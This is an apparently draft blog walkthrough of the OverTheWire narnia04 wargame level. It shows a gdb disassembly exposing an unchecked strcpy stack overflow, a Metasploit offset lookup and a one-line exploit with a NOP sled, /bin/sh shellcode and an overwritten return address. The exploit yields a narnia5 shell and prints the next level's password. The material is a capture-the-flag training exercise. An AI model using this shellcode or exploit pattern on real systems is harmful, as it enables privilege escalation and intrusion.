+++
title = "Over the wire - narnia04"
description = "Walk-through"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "over-the-wire-narnia-04"
project_url = "https://greyhat.dk/over-the-wire-narnia-04"
type = "post"
+++



(gdb) disassemble main
Dump of assembler code for function main:
   0x080484ad <+0>:	push   ebp
   0x080484ae <+1>:	mov    ebp,esp
   0x080484b0 <+3>:	and    esp,0xfffffff0
   0x080484b3 <+6>:	sub    esp,0x120 ; 288 
   0x080484b9 <+12>:	mov    DWORD PTR [esp+0x11c],0x0
   0x080484c4 <+23>:	jmp    0x8048511 <main+100>
   0x080484c6 <+25>:	mov    eax,ds:0x80497e0 ; <environ@@GLIBC_2.0>:	"`\327\377\377"
   0x080484cb <+30>:	mov    edx,DWORD PTR [esp+0x11c]
   0x080484d2 <+37>:	shl    edx,0x2
   0x080484d5 <+40>:	add    eax,edx
   0x080484d7 <+42>:	mov    eax,DWORD PTR [eax]
   0x080484d9 <+44>:	mov    DWORD PTR [esp],eax
   0x080484dc <+47>:	call   0x8048380 <strlen@plt>
   0x080484e1 <+52>:	mov    edx,DWORD PTR ds:0x80497e0
   0x080484e7 <+58>:	mov    ecx,DWORD PTR [esp+0x11c]
   0x080484ee <+65>:	shl    ecx,0x2
   0x080484f1 <+68>:	add    edx,ecx
   0x080484f3 <+70>:	mov    edx,DWORD PTR [edx]
   0x080484f5 <+72>:	mov    DWORD PTR [esp+0x8],eax
   0x080484f9 <+76>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048501 <+84>:	mov    DWORD PTR [esp],edx
   0x08048504 <+87>:	call   0x80483a0 <memset@plt>
   0x08048509 <+92>:	add    DWORD PTR [esp+0x11c],0x1
   0x08048511 <+100>:	mov    eax,ds:0x80497e0
   0x08048516 <+105>:	mov    edx,DWORD PTR [esp+0x11c]
   0x0804851d <+112>:	shl    edx,0x2
   0x08048520 <+115>:	add    eax,edx
   0x08048522 <+117>:	mov    eax,DWORD PTR [eax]
   0x08048524 <+119>:	test   eax,eax
   0x08048526 <+121>:	jne    0x80484c6 <main+25>
   0x08048528 <+123>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804852c <+127>:	jle    0x8048546 <main+153>
   0x0804852e <+129>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048531 <+132>:	add    eax,0x4
   0x08048534 <+135>:	mov    eax,DWORD PTR [eax]
   0x08048536 <+137>:	mov    DWORD PTR [esp+0x4],eax
   0x0804853a <+141>:	lea    eax,[esp+0x1c]
   0x0804853e <+145>:	mov    DWORD PTR [esp],eax
   0x08048541 <+148>:	call   0x8048360 <strcpy@plt>
   0x08048546 <+153>:	mov    eax,0x0
   0x0804854b <+158>:	leave
   0x0804854c <+159>:	ret
End of assembler dump.


kgn@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 0x316a4130
[*] Exact match at offset 272

narnia4@melinda:/tmp/d4$ /narnia/narnia4 $(python -c 'print "\x90"*219 + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90\xd7\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy
